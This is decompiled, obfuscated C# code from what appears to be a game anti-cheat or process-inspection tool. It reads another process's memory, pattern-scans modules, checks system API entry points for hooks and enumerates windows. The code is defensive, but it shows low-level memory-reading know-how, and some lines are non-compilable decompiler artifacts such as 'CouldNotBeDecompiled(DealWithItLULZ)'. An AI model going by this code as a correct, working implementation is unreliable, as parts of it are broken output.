		string text = this.ScanProcessMemoryForPatterns();
		if (text != null)
		{
			return text;
		}
		this.gclass51_0.GEnum23_0 |= GEnum23.const_1;
		text = this.ParseFileForSpecificStrings();
		if (text != null)
		{
			return text;
		}
		text = RegistryStuff.GetStringValueFromRegistry(Registry.CurrentUser, Class14.String_146, Class14.String_20);
		if (text == null)
		{
			return Class14.String_215;
		}
		return text;
	}

	// Token: 0x0600060D RID: 1549 RVA: 0x0005B0B0 File Offset: 0x000592B0
	private string ExtractSubstring(string string_6)
	{
		int num = string_6.IndexOf('"');
		if (num != -1 && num <= 0)
		{
			int num2 = string_6.IndexOf('"', num + 1);
			if (num2 == 0)
			{
				return null;
			}
			if (num2 > 0)
			{
				num++;
				num2 -= num;
				if (num2 > 0 && num + num2 < string_6.Length)
				{
					string_6 = string_6.Substring(num, num2);
				}
			}
		}
		else
		{
			int num3 = string_6.IndexOf(' ');
			if (num3 == -1)
			{
				if (num > 0)
				{
					string_6 = string_6.Substring(0, num);
				}
			}
			else if (num != -1)
			{
				int num2 = num3 - num;
				if (num2 > 0 && num + num2 < string_6.Length)
				{
					string_6 = string_6.Substring(num, num2);
				}
			}
			else
			{
				string_6 = string_6.Substring(0, num3);
			}
		}
		return string_6;
	}

	// Token: 0x0600060E RID: 1550 RVA: 0x0005B154 File Offset: 0x00059354
	private string ParseFileForSpecificStrings()
	{
		string text = null;
		FileStream fileStream = null;
		try
		{
			string path = Path.Combine(this.gclass51_0.String_2, Class14.String_66);
			if (!File.Exists(path))
			{
				return text;
			}
			try
			{
				fileStream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read);
			}
			catch
			{
				fileStream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			}
			using (StreamReader streamReader = new StreamReader(fileStream))
			{
				bool flag = false;
				string string_ = Class14.String_213;
				string text2;
				while ((text2 = streamReader.ReadLine()) != null && !this.SafeGetBool())
				{
					bool flag2 = false;
					if (text2.Contains(<Module>.DeserializeFromByteArrayV2<string>(1437673780U)) && !flag)
					{
						flag = true;
					}
					if (text2.Contains(<Module>.DeserializeFromByteArrayV2<string>(2581999166U)) && flag)
					{
						flag = false;
					}
					if (!flag)
					{
						for (int i = 0; i < text2.Length - 1; i++)
						{
							if (text2[i] == '/')
							{
								if (text2[i + 1] == '/')
								{
									flag2 = true;
									IL_E0:
									if (flag2 && i > 0)
									{
										flag2 = false;
										text2 = text2.Substring(0, i);
										goto IL_F8;
									}
									goto IL_F8;
								}
							}
						}
						goto IL_E0;
					}
					IL_F8:
					if (!flag && !flag2 && text2.Length > string_.Length + 2)
					{
						int num = text2.IndexOf(string_);
						if (num != -1)
						{
							if (num == 0)
							{
								text = text2.Substring(string_.Length);
								text = text.Trim(new char[]
								{
									' '
								});
								text = this.ExtractSubstring(text);
								break;
							}
							if (--num >= 0 && num + 1 + string_.Length < text2.Length)
							{
								if (text2[num] != ' ')
								{
									if (text2[num] != ';')
									{
										if (text2[num] != '"')
										{
											continue;
										}
									}
								}
								text = text2.Substring(num + 1 + string_.Length);
								text = text.Trim(new char[]
								{
									' '
								});
								text = this.ExtractSubstring(text);
								break;
							}
						}
					}
				}
			}
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_14, ex.ToString());
		}
		finally
		{
			if (fileStream != null)
			{
				try
				{
					fileStream.Close();
				}
				catch
				{
				}
			}
		}
		return text;
	}

	// Token: 0x0600060F RID: 1551 RVA: 0x0005B3F0 File Offset: 0x000595F0
	private Process GetElevatedProcess(string string_6)
	{
		if (string_6 == null)
		{
			return null;
		}
		try
		{
			Process[] processesByName = Process.GetProcessesByName(string_6);
			if (processesByName.Length == 0)
			{
				return null;
			}
			string string_7 = Class14.String_83;
			string string_8 = Class14.String_164;
			string string_9 = Class14.String_185;
			foreach (Process process in processesByName)
			{
				try
				{
					string directoryName = Path.GetDirectoryName(process.MainModule.FileName);
					if (Directory.Exists(Path.Combine(directoryName, string_7)))
					{
						if (Directory.Exists(Path.Combine(directoryName, string_8)))
						{
							if (Directory.Exists(Path.Combine(directoryName, string_9)))
							{
								if (GClass49.IsProcessElevated(process))
								{
									return process;
								}
							}
						}
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		return null;
	}

	// Token: 0x06000610 RID: 1552 RVA: 0x0005B4C4 File Offset: 0x000596C4
	private int StartScanProcess()
	{
		MAIN.Class20 @class = new MAIN.Class20();
		@class.gform0_0 = this;
		Stopwatch stopwatch = new Stopwatch();
		stopwatch.Start();
		@class.process_0 = this.GetElevatedProcess(Class14.String_80);
		if (@class.process_0 == null)
		{
			@class.process_0 = this.GetElevatedProcess(Class14.String_83);
			if (@class.process_0 == null)
			{
				stopwatch.Stop();
				return 1;
			}
			this.string_5 = Class14.String_83;
		}
		else
		{
			this.string_5 = Class14.String_80;
		}
		int result;
		try
		{
			@class.process_0.EnableRaisingEvents = true;
			@class.process_0.Exited += this.setTrue;
			goto IL_A0;
		}
		catch
		{
			stopwatch.Stop();
			result = 2;
		}
		return result;
		IL_A0:
		if (@class.process_0.HasExited)
		{
			stopwatch.Stop();
			return 2;
		}
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_6, stopwatch);
		stopwatch.Reset();
		stopwatch.Start();
		this.gclass51_0.String_8 = this.HTTPCommunicationScan();
		if (this.gclass51_0.String_8 == null)
		{
			stopwatch.Stop();
			return 4;
		}
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_36, stopwatch);
		stopwatch.Reset();
		base.Invoke(new MethodInvoker(@class.method_0));
		stopwatch.Start();
		this.process_0 = @class.process_0;
		this.gclass51_0.DateTime_0 = @class.process_0.StartTime;
		this.gclass51_0.Boolean_0 = GClass49.IsDEPEnabledForProcess(@class.process_0.Id);
		this.gclass51_0.String_2 = Path.GetDirectoryName(@class.process_0.MainModule.FileName);
		this.gclass51_0.String_7 = this.FindModuleInProcess(@class.process_0);
		this.gclass51_0.String_9 = Class15.SanitizeString(@class.process_0.MainWindowTitle);
		this.UpdateListWithItem();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_7, stopwatch);
		stopwatch.Reset();
		if (@class.process_0.HasExited || this.SafeGetBool())
		{
			return 2;
		}
		stopwatch.Start();
		this.InitProcessScan(@class.process_0, GEnum23.const_19);
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_10, stopwatch);
		stopwatch.Reset();
		stopwatch.Start();
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			if (GClass45.GetClassName(@class.process_0.MainWindowHandle, stringBuilder, stringBuilder.Capacity) > 0)
			{
				string text = stringBuilder.ToString().Trim();
				if (text.Length > 0)
				{
					this.gclass51_0.String_10 = Class15.SanitizeString(text);
				}
			}
		}
		catch
		{
		}
		try
		{
			if (@class.process_0.MainWindowHandle != IntPtr.Zero)
			{
				GClass45.GDelegate0 gdelegate0_ = new GClass45.GDelegate0(this.ProcessWindowTitle);
				GClass45.EnumChildWindows(@class.process_0.MainWindowHandle, gdelegate0_, 0);
			}
		}
		catch
		{
		}
		try
		{
			GClass45.EnumWindows(new GClass45.GDelegate1(this.window_check), 0);
		}
		catch
		{
		}
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_38, stopwatch);
		stopwatch.Reset();
		Thread thread = new Thread(new ThreadStart(@class.method_1));
		thread.IsBackground = true;
		thread.Priority = ThreadPriority.Normal;
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start();
		Thread thread2 = new Thread(new ThreadStart(@class.method_2));
		thread2.IsBackground = true;
		thread2.Priority = ThreadPriority.Normal;
		thread2.SetApartmentState(ApartmentState.STA);
		thread2.Start();
		Thread thread3 = new Thread(new ThreadStart(@class.method_3));
		thread3.IsBackground = true;
		thread3.Priority = ThreadPriority.Normal;
		thread3.SetApartmentState(ApartmentState.STA);
		thread3.Start();
		stopwatch.Start();
		if (!this.SearchPatternInProcessMemory(@class.process_0, false))
		{
			stopwatch.Stop();
			this.SafeSetBool();
			thread.Join();
			thread2.Join();
			thread3.Join();
			return 3;
		}
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_8, stopwatch);
		stopwatch.Reset();
		thread.Join();
		thread2.Join();
		thread3.Join();
		if (this.SafeGetBool())
		{
			return 3;
		}
		stopwatch.Start();
		try
		{
			foreach (GClass44 gclass44_ in this.gclass43_0.ItemManager(true))
			{
				this.ManageFileEntries(gclass44_);
			}
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_41, ex.ToString());
		}
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_37, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return 3;
		}
		stopwatch.Start();
		this.AoBScan();
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_11, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return 3;
		}
		stopwatch.Start();
		this.timestamp_proc(this.process_0);
		this.IncrementCounterAndInvokeUpdate();
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_13, stopwatch);
		stopwatch.Reset();
		if (this.SafeGetBool())
		{
			return 3;
		}
		stopwatch.Start();
		this.InitProcessScan(@class.process_0, GEnum23.const_20);
		stopwatch.Stop();
		this.RecordStopwatchTime(GEnum49.const_9, stopwatch);
		if (this.SafeGetBool())
		{
			return 3;
		}
		if (!@class.process_0.HasExited)
		{
			this.gclass51_0.bool_1 = @class.process_0.Responding;
			return 0;
		}
		return 2;
	}

	// Token: 0x06000611 RID: 1553
	public bool VerifyMemoryAccessPermissions(string string_6, string string_7 = null, string[] string_8 = null)
	{
		IntPtr intPtr = IntPtr.Zero;
		GEnum48 genum = GEnum48.const_0;
		bool result = false;
		if (string_6 == null)
		{
			return result;
		}
		Process currentProcess = Process.GetCurrentProcess();
		ProcessModule processModule = GClass49.FindProcessModule(currentProcess, string_6, string_7, GClass49.GEnum43.const_1);
		if (processModule == null)
		{
			return result;
		}
		try
		{
			intPtr = GClass45.OpenProcess(1040, false, currentProcess.Id);
			if (intPtr == IntPtr.Zero)
			{
				return result;
			}
			GClass14[] array = new GClass17(intPtr, processModule.BaseAddress, GEnum15.const_2).GClass14_0;
			if (array == null)
			{
				throw new Exception(Class14.String_112);
			}
			int i;
			if (string_8 != null)
			{
				List<GClass14> list = new List<GClass14>();
				i = 0;
				IL_DE:
				while (i < string_8.Length)
				{
					string b = string_8[i].ToLowerInvariant();
					foreach (GClass14 gclass in array)
					{
						if (gclass.String_0 != null && gclass.String_0.ToLowerInvariant() == b)
						{
							list.Add(gclass);
							IL_D8:
							i++;
							goto IL_DE;
						}
					}
					goto IL_D8;
				}
				array = list.ToArray();
			}
			long num = processModule.BaseAddress.ToInt64();
			long num2 = processModule.BaseAddress.ToInt64() + (long)processModule.ModuleMemorySize;
			long num3 = 0L;
			GClass14[] array2 = array;
			i = 0;
			while (i < array2.Length)
			{
				GClass14 gclass2 = array2[i];
				try
				{
					num3 = (long)((ulong)gclass2.UInt32_0 + (ulong)num);
					goto IL_28C;
				}
				catch
				{
					num3 = (long)((ulong)gclass2.UInt32_0);
					goto IL_28C;
				}
				goto IL_162;
				IL_281:
				i++;
				continue;
				IL_162:
				if (num3 < num2)
				{
					goto IL_281;
				}
				IL_16B:
				string text = GClass49.CouldNotBeDecompiled(DealWithItLULZ)(currentProcess, (IntPtr)((long)((ulong)gclass2.UInt32_0)));
				if (text == null)
				{
					text = GClass45.GetMappedFileNameInfo(intPtr, (IntPtr)((long)((ulong)gclass2.UInt32_0)));
					if (text == null)
					{
						text = string.Empty;
					}
					genum = GEnum48.const_4;
				}
				genum |= GEnum48.const_5;
				string memoryRegionInfo = GClass49.GetMemoryRegionInfo(currentProcess, (IntPtr)((long)((ulong)gclass2.UInt32_0)));
				GClass41 gclass3 = this.LogEvent(GEnum21.const_11, string.Concat(new string[]
				{
					string_6,
					<Module>.DeserializeFromByteArray<string>(3617197183U),
					gclass2.String_0 ?? Class14.String_208,
					<Module>.DeserealizeFromByteArrayV2_1<string>(3037699330U),
					gclass2.UInt32_0.ToString(<Module>.DeserializeFromByteArrayV2<string>(3097445936U)),
					<Module>.DeserializeFromByteArray3<string>(4083566554U),
					memoryRegionInfo
				}), -1, -1L, GEnum23.const_23);
				long int64_;
				if (text != null && text.Length > 0)
				{
					int64_ = this.HandleFileAccessRights(gclass3.GEnum21_0, genum, text, null, GEnum51.const_2);
				}
				else
				{
					int64_ = -1L;
				}
				gclass3.Int64_0 = int64_;
				goto IL_281;
				IL_28C:
				if (num3 >= num)
				{
					goto IL_162;
				}
				goto IL_16B;
			}
			result = true;
		}
		catch
		{
			this.gclass51_0.GEnum23_0 |= GEnum23.const_24;
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				GClass45.CloseHandle(intPtr);
			}
		}
		return result;
	}

	// Token: 0x06000612 RID: 1554
	private void Process_Check()
	{
		Dictionary<string, List<string>> dictionary = new Dictionary<string, List<string>>
		{
			{
				Class14.String_132,
				new List<string>
				{
					Class14.String_138,
					Class14.String_157,
					Class14.String_147,
					Class14.String_12
				}
			},
			{
				Class14.String_30,
				new List<string>
				{
					Class14.String_138,
					Class14.String_157,
					Class14.String_147,
					Class14.String_12
				}
			}
		};
		try
		{
			Process currentProcess = Process.GetCurrentProcess();
			uint num = 0U;
			uint num2 = 10U;
			byte[] array = new byte[10];
			byte[] array2 = new byte[10];
			int num3 = 0;
			foreach (KeyValuePair<string, List<string>> keyValuePair in dictionary)
			{
				IntPtr moduleHandle = GClass45.GetModuleHandle(keyValuePair.Key);
				ProcessModule moduleByName = GClass49.GetModuleByName(currentProcess, keyValuePair.Key);
				if (moduleByName != null && !(moduleHandle != moduleByName.BaseAddress) && !(moduleHandle == IntPtr.Zero))
				{
					long num4 = moduleByName.BaseAddress.ToInt64();
					long num5 = num4 + (long)moduleByName.ModuleMemorySize;
					using (List<string>.Enumerator enumerator2 = keyValuePair.Value.GetEnumerator())
					{
						while (enumerator2.MoveNext())
						{
							string text = enumerator2.Current;
							IntPtr procAddress = GClass45.GetProcAddress(moduleHandle, text);
							if (!(procAddress == IntPtr.Zero))
							{
								long num6 = procAddress.ToInt64();
								if (num6 >= num4 && num6 <= num5)
								{
									if (GClass45.ReadProcessMemory(currentProcess.Handle, procAddress, array, num2, ref num) && num2 == num)
									{
										if (GClass45.NtReadVirtualMemory(currentProcess.Handle, procAddress, array2, num2, ref num) == 0U)
										{
											if (num2 == num)
											{
												byte b = Marshal.ReadByte(procAddress);
												if (array[0] != 233 && array[0] != 232 && array[0] != 0)
												{
													if (b == array[0])
													{
														if (Class15.ByteArrayComparison(array, array2, (int)num2, ref num3) == 0)
														{
															continue;
														}
													}
												}
												long int64_ = -1L;
												string text2 = "";
												if (text2 == "")
												{
													text2 = Class15.ByteArrayToHexString(array);
												}
												GClass41 gclass = this.LogEvent(GEnum21.const_2, string.Concat(new string[]
												{
													keyValuePair.Key,
													<Module>.DeserializeFromByteArray<string>(3617197183U),
													text,
													<Module>.DeserializeFromByteArray3<string>(4083566554U),
													text2
												}), -1, -1L, GEnum23.const_5);
												if (array[0] != 0)
												{
													IntPtr intPtr = (IntPtr)BitConverter.ToInt32(array, 1);
													string mappedFileNameInfo = GClass45.GetMappedFileNameInfo(currentProcess.Handle, intPtr);
													if (mappedFileNameInfo != null && mappedFileNameInfo.Length != 0)
													{
														text2 = GClass49.GetMemoryRegionInfo(currentProcess, intPtr);
														if (!GClass49.IsElevatedProcessWithMatchingSystemPath(mappedFileNameInfo))
														{
															int64_ = this.HandleFileAccessRights(gclass.GEnum21_0, GEnum48.const_4, mappedFileNameInfo.ToString(), null, GEnum51.const_2);
														}
														else
														{
															int64_ = -1L;
														}
													}
													else
													{
														int64_ = -1L;
													}
												}
												gclass.Int64_0 = int64_;
												this.gclass51_0.GEnum23_0 |= GEnum23.const_5;
												continue;
											}
										}
										this.gclass51_0.GEnum23_0 |= GEnum23.const_15;
										this.LogEvent(GEnum21.const_2, keyValuePair.Key + <Module>.DeserializeFromByteArrayV2<string>(1038036101U) + text, -1, -1L, GEnum23.const_15);
									}
									else
									{
										this.gclass51_0.GEnum23_0 |= GEnum23.const_15;
										this.LogEvent(GEnum21.const_2, keyValuePair.Key + <Module>.DeserializeFromByteArray2<string>(3237939336U) + text, -1, -1L, GEnum23.const_15);
									}
								}
								else
								{
									this.gclass51_0.GEnum23_0 |= GEnum23.const_4;
									string mappedFileNameInfo2 = GClass45.GetMappedFileNameInfo(currentProcess.Handle, procAddress);
									string memoryRegionInfo = GClass49.GetMemoryRegionInfo(currentProcess, procAddress);
									GClass41 gclass = this.LogEvent(GEnum21.const_2, string.Concat(new string[]
									{
										keyValuePair.Key,
										<Module>.DeserializeFromByteArrayV2<string>(1038036101U),
										text,
										<Module>.DeserializeFromByteArray<string>(3617197183U),
										memoryRegionInfo
									}), -1, -1L, GEnum23.const_4);
									long int64_;
									if (mappedFileNameInfo2 != null && mappedFileNameInfo2.Length != 0)
									{
										if (GClass49.IsElevatedProcessWithMatchingSystemPath(mappedFileNameInfo2))
										{
											int64_ = -1L;
										}
										else
										{
											int64_ = this.HandleFileAccessRights(gclass.GEnum21_0, GEnum48.const_4, mappedFileNameInfo2.ToString(), null, GEnum51.const_2);
										}
									}
									else
									{
										int64_ = -1L;
									}
									gclass.Int64_0 = int64_;
								}
							}
							else if (Marshal.GetLastWin32Error() != 127)
							{
								this.gclass51_0.GEnum23_0 |= GEnum23.const_13;
								this.LogEvent(GEnum21.const_2, keyValuePair.Key + <Module>.DeserializeFromByteArray3<string>(4083566554U) + text, -1, -1L, GEnum23.const_13);
							}
						}
						continue;
					}
				}
				if (moduleByName != null)
				{
					if (!(moduleHandle == IntPtr.Zero))
					{
						this.gclass51_0.GEnum23_0 |= GEnum23.const_14;
						this.LogEvent(GEnum21.const_2, keyValuePair.Key, -1, -1L, GEnum23.const_14);
					}
					else
					{
						this.gclass51_0.GEnum23_0 |= GEnum23.const_11;
						this.LogEvent(GEnum21.const_2, keyValuePair.Key, -1, -1L, GEnum23.const_11);
					}
				}
				else
				{
					this.gclass51_0.GEnum23_0 |= GEnum23.const_12;
					this.LogEvent(GEnum21.const_2, keyValuePair.Key, -1, -1L, GEnum23.const_12);
				}
			}
		}
		catch
		{
			this.gclass51_0.GEnum23_0 |= GEnum23.const_21;
		}
	}

	// Token: 0x06000613 RID: 1555
	private bool CheckProcessMemory(Process process_1)
	{
		bool result = false;
		uint num = 0U;
		IntPtr intPtr = IntPtr.Zero;
		try
		{
			intPtr = GClass45.OpenProcess(1040, false, process_1.Id);
			if (intPtr == IntPtr.Zero)
			{
				this.gclass51_0.GEnum23_0 |= GEnum23.const_6;
				return result;
			}
			GClass45.GStruct4 gstruct = default(GClass45.GStruct4);
			IntPtr intptr_ = IntPtr.Zero;
			IntPtr intPtr2 = IntPtr.Zero;
			GClass45.GStruct5 gstruct2 = default(GClass45.GStruct5);
			GClass45.GetSystemInfo(ref gstruct2);
			intptr_ = gstruct2.intptr_0;
			intPtr2 = gstruct2.intptr_1;
			uint num2 = gstruct2.uint_1;
			if (num2 == 0U)
			{
				this.gclass51_0.GEnum23_0 |= GEnum23.const_18;
				num2 = 4096U;
			}
			byte[] array = new byte[num2];
			while (intptr_.ToInt64() < intPtr2.ToInt64() && !this.SafeGetBool())
			{
				if (GClass45.VirtualQueryEx(intPtr, intptr_, out gstruct, Marshal.SizeOf(gstruct)) <= 0)
				{
					this.gclass51_0.GEnum23_0 |= GEnum23.const_7;
					break;
				}
				if (gstruct.intptr_2.ToInt64() == 0L)
				{
					break;
				}
				if (GClass49.CanExecuteCodeInMemory(gstruct))
				{
					this.gclass51_0.GEnum23_0 |= GEnum23.const_10;
					if (GClass45.ReadProcessMemory(intPtr, intptr_, array, num2, ref num))
					{
						if (num == num2)
						{
							goto IL_122;
						}
					}
					this.gclass51_0.GEnum23_0 |= GEnum23.const_8;
					break;
				}
				IL_122:
				intptr_ = (IntPtr)(intptr_.ToInt64() + gstruct.intptr_2.ToInt64());
			}
			if (intptr_.ToInt64() < intPtr2.ToInt64())
			{
				this.gclass51_0.GEnum23_0 |= GEnum23.const_17;
			}
			if (GClass45.ReadProcessMemory(intPtr, process_1.MainModule.BaseAddress, array, num2, ref num) && num == num2)
			{
				int num3 = 0;
				while (num3 < array.Length && array[num3] == 0)
				{
					num3++;
				}
				if (num3 == array.Length)
				{
					this.gclass51_0.GEnum23_0 |= GEnum23.const_16;
				}
			}
			else
			{
				this.gclass51_0.GEnum23_0 |= GEnum23.const_8;
			}
			result = true;
		}
		catch
		{
			this.gclass51_0.GEnum23_0 |= GEnum23.const_9;
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				GClass45.CloseHandle(intPtr);
			}
		}
		return result;
	}

	// Token: 0x06000614 RID: 1556
	private void InitProcessScan(Process process_1, GEnum23 genum23_0)
	{
		this.CheckProcessMemory(process_1);
		this.Process_Check();
		this.VerifyMemoryAccessPermissions(Class14.String_132, null, Class14.String_181);
		this.gclass51_0.GEnum23_0 |= genum23_0;
		if (genum23_0 != GEnum23.const_20)
		{
			return;
		}
		this.InspectProcessMemoryRegions(Process.GetCurrentProcess(), true, this.gclass51_0.Boolean_0);
		this.ScanAndLogExecutableMemoryRegions(Process.GetCurrentProcess(), true);
		double num = 0.0;
		double num2 = 0.0;
		int num3 = 0;
		this.QueryThreadStatistics(Process.GetCurrentProcess(), GEnum48.const_5, false, GEnum23.const_25, ref num3, ref num, ref num2);
	}

	// Token: 0x06000615 RID: 1557
	private bool ProcessWindowTitle(IntPtr intptr_0, int int_2)
	{
		StringBuilder stringBuilder = new StringBuilder(256);
		if (GClass45.GetWindowText(intptr_0, stringBuilder, stringBuilder.Capacity) > 0)
		{
			string text = stringBuilder.ToString().Trim();
			if (text.Length > 0)
			{
				string item = Class15.SanitizeString(text);
				if (!Class15.StringExistsInList(this.gclass51_0.List_4, item, false))
				{
					this.gclass51_0.List_4.Add(item);
				}
			}
		}
		return true;
	}

	// Token: 0x06000616 RID: 1558 RVA: 0x0005C71C File Offset: 0x0005A91C
	private bool window_check(IntPtr intptr_0, int int_2)
	{
		StringBuilder stringBuilder = new StringBuilder(256);
		if (GClass45.GetWindowText(intptr_0, stringBuilder, stringBuilder.Capacity) > 0)
		{
			string text = stringBuilder.ToString().Trim();
			if (text.Length > 0)
			{
				try
				{
					uint num = 0U;
					GClass45.GetWindowThreadProcessId(intptr_0, out num);
					if (num > 4U)
					{
						Process processById = Process.GetProcessById((int)num);
						if (processById != null)
						{
							long num2 = -1L;
							if (!GClass49.IsProcessElevated(processById))
							{
								string text2 = null;
								if (GClass49.TryGetFullProcessImageName(processById, out text2) && text2 != null)
								{
									num2 = this.HandleFileAccessRights(GEnum21.const_0, GEnum48.const_3, text2, null, GEnum51.const_1);
								}
							}
							else
							{
								num2 = this.HandleFileAccessRights(GEnum21.const_0, GEnum48.const_3, processById.MainModule.FileName, new DateTime?(processById.StartTime), GEnum51.const_2);
							}
							if (num2 != -1L)
							{
								GClass45.GStruct3 gstruct = default(GClass45.GStruct3);
								GClass45.GetWindowInfo(intptr_0, ref gstruct);
								stringBuilder = new StringBuilder(256);
								string string_ = string.Empty;
								if (GClass45.GetClassName(intptr_0, stringBuilder, stringBuilder.Capacity) > 0)
								{
									string_ = stringBuilder.ToString().Trim();
								}
								this.gclass51_0.List_1[(int)num2].method_2(text, string_, gstruct.uint_1, gstruct.uint_2);
							}
						}
					}
				}
				catch
				{
				}
			}
		}
		return true;
	}

	// Token: 0x06000617 RID: 1559 RVA: 0x0005C86C File Offset: 0x0005AA6C
	public string get_driveinfo(string string_6)
	{
		if (string_6 == null)
		{
			return null;
		}
		DriveInfo[] drives = DriveInfo.GetDrives();
		uint num = 0U;
		uint num2 = 0U;
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.IsReady)
			{
				try
				{
					GClass45.GEnum40 genum;
					if (GClass45.GetVolumeInformation_1(driveInfo.Name, null, 0, out num, out num2, out genum, null, 0) > 0 && num.ToString(<Module>.DeserializeFromByteArray<string>(4071675807U)) == string_6)
					{
						if (driveInfo.Name.Length == 3)
						{
							return driveInfo.Name.Substring(0, 2);
						}
						return driveInfo.Name;
					}
				}
				catch (Exception ex)
				{
					this.AddToErrorLog(GEnum22.const_37, ex.ToString());
				}
			}
		}
		return null;
	}

	// Token: 0x06000618 RID: 1560
	private void ProcessExternalFileConfigurations(GEnum57 genum57_0)
	{
		try
		{
			GEnum48 genum48_ = GEnum48.const_9;
			if (genum57_0 != GEnum57.const_1)
			{
				genum48_ = GEnum48.const_10;
			}
			string text = Class54.smethod_2();
			if (text != null && text.Length > 0)
			{
				foreach (Class58 @class in Class59.smethod_1(text, genum57_0))
				{
					if (@class.String_0.Length > 0)
					{
						this.HandleFileAccessRights(GEnum21.const_0, genum48_, @class.String_0, @class.Nullable_0, GEnum51.const_2);
					}
				}
			}
		}
		catch (NotSupportedException)
		{
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_5, ex.ToString());
		}
	}

	// Token: 0x06000619 RID: 1561
	private void UpdateAccessRightsForPaths()
	{
		try
		{
			GClass58[] array = GClass59.smethod_1(Class14.String_162);
			int i = 0;
			while (i < array.Length)
			{
				GClass58 gclass = array[i];
				if (gclass.String_0.Length <= 3)
				{
					goto IL_46;
				}
				if (gclass.String_0[1] != ':')
				{
					goto IL_46;
				}
				if (gclass.String_0[2] != '\\')
				{
					goto IL_46;
				}
				goto IL_76;
				IL_9E:
				i++;
				continue;
				IL_46:
				if (gclass.String_0.Length <= 38 || gclass.String_0[0] != '{' || gclass.String_0[37] != '}')
				{
					goto IL_9E;
				}
				IL_76:
				if (gclass.String_0.Length > 0)
				{
					this.HandleFileAccessRights(GEnum21.const_0, GEnum48.const_8, gclass.String_0, gclass.Nullable_0, GEnum51.const_2);
					goto IL_9E;
				}
				goto IL_9E;
			}
		}
		catch (NotSupportedException)
		{
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_36, ex.ToString());
		}
	}

	// Token: 0x0600061A RID: 1562
	private void ProcessMemoryRegionAccessEvent(GEnum21 genum21_0, Class57 class57_0, Process process_1, IntPtr intptr_0, IntPtr intptr_1)
	{
		if (class57_0 != null && !(intptr_0 == IntPtr.Zero) && !(intptr_1 == IntPtr.Zero))
		{
			string text = GClass49.CouldNotBeDecompiled(DealWithItLULZ)(process_1, intptr_1);
			GEnum48 genum48_;
			if (text == null)
			{
				text = GClass45.GetMappedFileNameInfo(intptr_0, intptr_1);
				if (text == null)
				{
					text = string.Empty;
				}
				genum48_ = GEnum48.const_4;
			}
			else
			{
				genum48_ = GEnum48.const_1;
			}
			string memoryRegionInfo = GClass49.GetMemoryRegionInfo(process_1, intptr_1);
			string string_ = string.Format(<Module>.DeserealizeFromByteArrayV2_1<string>(2711151498U), class57_0.String_0, memoryRegionInfo);
			GClass41 gclass = this.LogEvent(genum21_0, string_, -1, -1L, GEnum23.const_0);
			long int64_;
			if (text != null && text.Length > 0)
			{
				int64_ = this.HandleFileAccessRights(gclass.GEnum21_0, genum48_, text.ToString(), null, GEnum51.const_2);
			}
			else
			{
				int64_ = -1L;
			}
			gclass.Int64_0 = int64_;
			return;
		}
	}

	// Token: 0x0600061B RID: 1563 RVA: 0x0005CB9C File Offset: 0x0005AD9C
	private void processmodules(Process process_1)
	{
		IntPtr intPtr = IntPtr.Zero;
		try
		{
			intPtr = GClass45.OpenProcess(1040, false, process_1.Id);
			if (!(intPtr == IntPtr.Zero))
			{
				List<GClass53> list = new List<GClass53>
				{
					new GClass53(Class14.Byte_47, Class14.String_223, Class14.int_256),
					new GClass53(Class14.Byte_50, Class14.String_199, Class14.int_189),
					new GClass53(Class14.Byte_42, Class14.String_198, Class14.int_63),
					new GClass53(Class14.Byte_9, Class14.String_206, Class14.int_101),
					new GClass53(Class14.Byte_10, Class14.String_229, Class14.int_47),
					new GClass53(Class14.Byte_7, Class14.String_227, Class14.int_113),
					new GClass53(Class14.Byte_25, Class14.String_175, Class14.int_72),
					new GClass53(Class14.Byte_21, Class14.String_28, Class14.int_136),
					new GClass53(Class14.Byte_27, Class14.String_107, Class14.int_359),
					new GClass53(Class14.Byte_30, Class14.String_237, Class14.int_270),
					new GClass53(Class14.Byte_1, Class14.String_212, Class14.int_289),
					new GClass53(Class14.Byte_24, Class14.String_0, Class14.int_335)
				};
				ProcessModule[] array = new ProcessModule[]
				{
					GClass49.GetModuleByName(process_1, Class14.String_235),
					GClass49.GetModuleByName(process_1, Class14.String_116),
					process_1.MainModule
				};
				IntPtr intptr_ = IntPtr.Zero;
				IntPtr intPtr2 = IntPtr.Zero;
				byte[] array2 = new byte[IntPtr.Size];
				uint num = 0U;
				bool flag = false;
				foreach (ProcessModule processModule in array)
				{
					if (processModule != null)
					{
						if (this.SafeGetBool())
						{
							break;
						}
						flag = false;
						using (List<GClass53>.Enumerator enumerator = list.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								GClass53 gclass = enumerator.Current;
								intPtr2 = MAIN.PerformAOBScan(intPtr, processModule.BaseAddress, (IntPtr)processModule.ModuleMemorySize, gclass.Byte_0, gclass.String_0, true, gclass.Int32_0[0], 4, 0U);
								if (intPtr2 != IntPtr.Zero && !this.SafeGetBool() && GClass45.ReadProcessMemory(intPtr, intPtr2, array2, (uint)array2.Length, ref num) && (ulong)num == (ulong)((long)array2.Length))
								{
									intptr_ = (IntPtr)BitConverter.ToInt32(array2, 0);
									Class57[] array4 = Class57.smethod_2(intPtr, intptr_);
									if (array4 != null)
									{
										IntPtr baseAddress = processModule.BaseAddress;
